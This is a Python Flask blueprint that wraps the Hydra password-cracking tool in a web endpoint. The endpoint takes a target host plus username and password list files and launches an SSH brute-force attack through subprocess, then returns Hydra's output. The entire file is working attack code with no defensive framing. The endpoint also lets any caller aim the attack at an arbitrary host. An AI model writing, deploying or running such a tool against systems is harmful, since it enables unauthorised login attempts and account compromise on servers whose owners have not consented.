import subprocess
import os
from flask import Blueprint, request, jsonify

ssh_bruteforce_bp = Blueprint("ssh_bruteforce", __name__)

@ssh_bruteforce_bp.route("/ssh_bruteforce", methods=["POST"])
def ssh_attack():
    """Run SSH Bruteforce using Hydra"""
    data = request.json
    target = data.get("target")
    username_list = data.get("username_list")
    password_list = data.get("password_list")

    if not target or not username_list or not password_list:
        return jsonify({"error": "Target, username list, and password list are required"}), 400

    if not os.path.exists(username_list) or not os.path.exists(password_list):
        return jsonify({"error": "Username or password file does not exist"}), 400

    try:
        # Run Hydra command
        command = [
            "hydra", "-L", username_list, "-P", password_list,
            target, "ssh"
        ]
        result = subprocess.run(command, capture_output=True, text=True)

        return jsonify({"output": result.stdout})
    
    except Exception as e:
        print("Error running Hydra:", str(e))
        return jsonify({"error": str(e)}), 500

